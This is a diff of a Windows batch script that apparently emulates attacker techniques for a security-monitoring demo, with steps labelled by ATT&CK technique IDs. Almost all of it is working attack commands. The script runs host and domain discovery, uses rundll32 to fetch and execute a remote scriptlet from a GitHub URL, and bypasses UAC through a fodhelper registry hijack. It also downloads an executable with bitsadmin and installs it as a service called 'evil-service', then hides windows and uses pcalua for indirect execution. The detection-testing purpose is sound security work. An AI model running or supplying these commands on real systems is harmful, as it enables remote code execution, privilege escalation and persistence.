@@ -13,8 +13,6 @@ pause
 
 
 echo %time% %date% [+++++++++++++++++++++++++++++++++++++++++] Discovery Process
-pause
-
 echo +++++++++++++++++++ Identify local users
 powershell -c "Get-WmiObject -Class Win32_UserAccount"
 echo +++++++++++++++++++ Identify active user
@@ -32,25 +30,41 @@ echo +++++++++++++++++++ Identify Firewall
 powershell -c "$NameSpace = Get-WmiObject -Namespace 'root' -Class '__Namespace' | Select Name | Out-String -Stream | Select-String 'SecurityCenter';$SecurityCenter = $NameSpace | Select-Object -First 1;Get-WmiObject -Namespace root\$SecurityCenter -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;"
 echo +++++++++++++++++++ Find Domain Controler
 powershell -c "nltest /dclist:%USERDOMAIN%"
+::timeout 5
 
-pause
-echo [+++++++++++++++++++++++++++++++++++++++++] T1088 - Bypass UAC using Fodhelper
-pause
+echo [+++++++++++++++++++++++++++++++++++++++++] T1085 - Rundll32 execute JavaScript Remote Payload With GetObject
+start "" cmd /c rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/dunghoangtrong/hsoc-demo/master/hsoc-t1085.sct").Exec();
+
+::timeout 5
+
+echo %time% %date% [+++++++++++++++++++++++++++++++++++++++++] T1088 - Bypass UAC using Fodhelper
 reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f
 reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
 fodhelper.exe
+::timeout 5
 
-echo %time% %date% 
-echo [+++++++++++++++++++++++++++++++++++++++++] T1197 - Bitsadmin Download executable file
+echo %time% %date% [+++++++++++++++++++++++++++++++++++++++++] T1197 - Bitsadmin Download executable file
+echo %time% %date% [+++++++++++++++++++++++++++++++++++++++++] T1050 - Service Installation
 bitsadmin.exe /transfer /Download /priority Foreground https://github.com/dunghoangtrong/hsoc-demo/blob/master/service.exe?raw=true %temp%\service.exe
+sc.exe create evil-service binPath= %temp%\service.exe
+sc.exe start evil-service
+::timeout 5
 
 echo [+++++++++++++++++++++++++++++++++++++++++] T1143 - Run Hidden Window
-powershell -c "Start-Process cmd.exe -WindowStyle hidden"
+start "" cmd /c powershell -c "Start-Process notepad.exe -WindowStyle hidden"
+::timeout 5
 
-echo [+++++++++++++++++++++++++++++++++++++++++] T1085 - Rundll32 execute JavaScript Remote Payload With GetObject
-start "" cmd /c rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/dunghoangtrong/hsoc-demo/master/hsoc-t1085.sct").Exec();close()
-pause
+echo [+++++++++++++++++++++++++++++++++++++++++] T1202 - Indirect Command Execution - pcalua.exe
+FOR /L %%A IN (1,1,10) DO (
+    pcalua.exe -a calc.exe
+)
 
-echo Execution Finished at %time% %date%
+
 pause
+echo Cleanup Testing
 reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1
+sc.exe stop evil-service >nul 2>&1
+sc.exe delete evil-service >nul 2>&1
+del %temp%\service.exe
+taskkill /F /IM notepad.exe
+echo Execution Finished at %time% %date%
